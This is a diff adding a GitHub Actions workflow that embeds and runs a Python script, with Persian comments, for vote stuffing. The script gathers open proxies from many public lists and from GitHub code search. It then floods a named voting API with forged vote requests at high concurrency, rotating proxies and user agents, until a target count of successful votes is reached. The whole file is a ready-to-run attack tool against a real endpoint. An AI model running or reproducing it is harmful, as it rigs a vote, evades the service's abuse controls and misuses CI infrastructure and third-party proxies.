@@ -1,0 +1,261 @@
+name: ⚡ Universal Proxy Storm (No Hardcoded Proxies)
+
+on:
+  workflow_dispatch:
+    inputs:
+      target:
+        description: 'تعداد رأی موفق هدف'
+        required: true
+        default: '1000'
+      concurrency:
+        description: 'تعداد اتصال همزمان'
+        required: true
+        default: '200'
+
+jobs:
+  blast:
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+
+    steps:
+      - name: Setup Python
+        uses: actions/setup-python@v5
+        with:
+          python-version: '3.11'
+
+      - name: Install dependencies
+        run: pip install aiohttp aiohttp_socks beautifulsoup4 lxml
+
+      - name: Create & Run Script
+        env:
+          TARGET: ${{ github.event.inputs.target }}
+          CONCURRENCY: ${{ github.event.inputs.concurrency }}
+        run: |
+          cat << 'PYEOF' > attack.py
+          import aiohttp
+          import asyncio
+          import json
+          import random
+          import time
+          import re
+          import os
+          from aiohttp_socks import ProxyConnector, ProxyType
+          from urllib.parse import urlparse
+
+          API_URL = "https://voting-backend.shayan-farid-pc.workers.dev/api/vote"
+          VOTE_DATA = {"id": 1}
+
+          # لیست گسترده‌ای از منابع مختلف پروکسی (API، صفحات HTML، مخازن گیت‌هاب و غیره)
+          PROXY_SOURCES = [
+              "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
+              "https://www.proxy-list.download/api/v1/get?type=http",
+              "https://www.proxy-list.download/api/v1/get?type=https",
+              "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
+              "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
+              "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
+              "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt",
+              "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
+              "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies_anonymous/http.txt",
+              "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
+              "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-https.txt",
+              "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS.txt",
+              "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTP.txt",
+              "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
+              "https://raw.githubusercontent.com/ALIILAPRO/Proxy/main/http.txt",
+              "https://free-proxy-list.net/",
+              "https://www.sslproxies.org/",
+              "https://www.us-proxy.org/",
+              "https://www.socks-proxy.net/",
+              "https://hidemy.name/en/proxy-list/",
+              "https://spys.one/en/free-proxy-list/",
+              # API های دیگر
+              "https://proxylist.geonode.com/api/proxy-list?limit=100&page=1&sort_by=lastChecked&sort_type=desc",
+              "https://pubproxy.com/api/proxy?limit=20&format=txt&type=http",
+          ]
+
+          USER_AGENTS = [
+              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+              "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
+              "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36",
+              "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
+              "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+          ]
+
+          async def fetch_text(session, url):
+              try:
+                  async with session.get(url, timeout=aiohttp.ClientTimeout(total=8)) as resp:
+                      return await resp.text()
+              except:
+                  return ""
+
+          def extract_proxies(text):
+              pattern = re.compile(r'\b(?:\d{1,3}\.){3}\d{1,3}:\d{2,5}\b')
+              return set(pattern.findall(text))
+
+          async def fetch_proxies_from_source(session, url):
+              try:
+                  text = await fetch_text(session, url)
+                  if not text:
+                      return set()
+                  proxies = set()
+                  for line in text.splitlines():
+                      line = line.strip()
+                      if re.match(r'\d+\.\d+\.\d+\.\d+:\d+', line) and not line.startswith('#'):
+                          proxies.add(line)
+                  if '<html' in text.lower() or '<table' in text.lower():
+                      proxies.update(extract_proxies(text))
+                  # برای APIهای JSON
+                  if url.startswith("https://proxylist.geonode.com") or url.startswith("https://pubproxy.com"):
+                      try:
+                          data = json.loads(text)
+                          if isinstance(data, list):
+                              for item in data:
+                                  if 'ip' in item and 'port' in item:
+                                      proxies.add(f"{item['ip']}:{item['port']}")
+                          elif isinstance(data, dict):
+                              items = data.get('data', [])
+                              for item in items:
+                                  if 'ip' in item and 'port' in item:
+                                      proxies.add(f"{item['ip']}:{item['port']}")
+                      except:
+                          pass
+                  return proxies
+              except:
+                  return set()
+
+          async def gather_all_proxies():
+              all_proxies = set()
+              async with aiohttp.ClientSession() as session:
+                  # جستجوی گیت‌هاب برای فایل‌های proxy.txt جدید
+                  github_queries = [
+                      "https://api.github.com/search/code?q=proxy+list+filename:proxies.txt+http",
+                      "https://api.github.com/search/code?q=proxy+list+filename:proxy.txt+http",
+                      "https://api.github.com/search/code?q=proxy+list+filename:http.txt+proxy",
+                  ]
+                  headers = {"Accept": "application/vnd.github.v3+json"}
+                  for q in github_queries:
+                      try:
+                          async with session.get(q, headers=headers, timeout=10) as resp:
+                              data = await resp.json()
+                              if 'items' in data:
+                                  for item in data['items'][:10]:
+                                      raw_url = item['html_url'].replace('github.com','raw.githubusercontent.com').replace('/blob/','/')
+                                      text = await fetch_text(session, raw_url)
+                                      if text:
+                                          for line in text.splitlines():
+                                              line = line.strip()
+                                              if re.match(r'\d+\.\d+\.\d+\.\d+:\d+', line):
+                                                  all_proxies.add(line)
+                      except:
+                          continue
+
+                  # منابع ثابت
+                  tasks = [fetch_proxies_from_source(session, src) for src in PROXY_SOURCES]
+                  results = await asyncio.gather(*tasks)
+                  for res in results:
+                      all_proxies.update(res)
+
+              return list(all_proxies)
+
+          def get_proxy_type_and_url(proxy_str):
+              if proxy_str.startswith("socks5://"):
+                  return ProxyType.SOCKS5, proxy_str
+              elif proxy_str.startswith("socks4://"):
+                  return ProxyType.SOCKS4, proxy_str
+              elif proxy_str.startswith("http://"):
+                  return ProxyType.HTTP, proxy_str
+              elif proxy_str.startswith("https://"):
+                  return ProxyType.HTTP, proxy_str
+              else:
+                  return ProxyType.HTTP, f"http://{proxy_str}"
+
+          async def vote(session, proxy_str, sem, stats):
+              async with sem:
+                  headers = {
+                      "Content-Type": "application/json",
+                      "User-Agent": random.choice(USER_AGENTS),
+                  }
+                  try:
+                      ptype, purl = get_proxy_type_and_url(proxy_str)
+                      parsed = urlparse(purl)
+                      connector = ProxyConnector(
+                          proxy_type=ptype,
+                          host=parsed.hostname,
+                          port=parsed.port,
+                          rdns=True
+                      )
+                      async with aiohttp.ClientSession(connector=connector) as proxy_session:
+                          async with proxy_session.post(
+                              API_URL,
+                              data=json.dumps(VOTE_DATA),
+                              headers=headers,
+                              timeout=aiohttp.ClientTimeout(total=3)
+                          ) as resp:
+                              status = resp.status
+                              text = await resp.text()
+                              if status == 200:
+                                  data = json.loads(text)
+                                  if data.get("success"):
+                                      stats['success'] += 1
+                                      return (True, proxy_str)
+                              stats['failed'] += 1
+                              return (False, proxy_str)
+                  except:
+                      stats['failed'] += 1
+                      return (False, proxy_str)
+
+          async def progress_reporter(stats, total_target, start_time):
+              while True:
+                  await asyncio.sleep(1)
+                  elapsed = time.time() - start_time
+                  done = stats['success'] + stats['failed']
+                  rate = done / elapsed if elapsed > 0 else 0
+                  print(f"\r⚡ پیشرفت: {stats['success']}/{total_target} رأی موفق | {stats['failed']} شکست | "
+                        f"{done} درخواست | سرعت: {rate:.1f} req/s", end="")
+                  if stats['success'] >= total_target:
+                      break
+
+          async def main():
+              target = int(os.getenv("TARGET", 1000))
+              concurrency = int(os.getenv("CONCURRENCY", 200))
+
+              print("🚀 شروع عملیات با پروکسی‌های جمع‌آوری‌شده از کل وب")
+              t0 = time.time()
+
+              print("📥 در حال جمع‌آوری پروکسی از تمام منابع...")
+              proxy_list = await gather_all_proxies()
+              print(f"✅ {len(proxy_list)} پروکسی دریافت شد. شروع حمله...\n")
+
+              if not proxy_list:
+                  print("❌ هیچ پروکسی پیدا نشد!")
+                  return
+
+              stats = {'success': 0, 'failed': 0}
+              sem = asyncio.Semaphore(concurrency)
+              reporter_task = asyncio.create_task(progress_reporter(stats, target, t0))
+
+              tasks = []
+              proxy_cycle = proxy_list.copy()
+              while stats['success'] < target:
+                  needed = target - stats['success'] + concurrency
+                  for _ in range(needed):
+                      if not proxy_cycle:
+                          proxy_cycle = proxy_list.copy()
+                      proxy = proxy_cycle.pop(0)
+                      task = asyncio.create_task(vote(None, proxy, sem, stats))
+                      tasks.append(task)
+                  await asyncio.sleep(0.1)
+                  tasks = [t for t in tasks if not t.done()]
+
+              reporter_task.cancel()
+              print("\n\n🎉 کار تموم شد!")
+              print(f"   ✅ موفق: {stats['success']}")
+              print(f"   ❌ ناموفق: {stats['failed']}")
+              print(f"   ⏱️ زمان: {time.time() - t0:.1f} ثانیه")
+
+          if __name__ == "__main__":
+              asyncio.run(main())
+          PYEOF
+
+          echo "🚀 اجرای اسکریپت..."
+          python attack.py
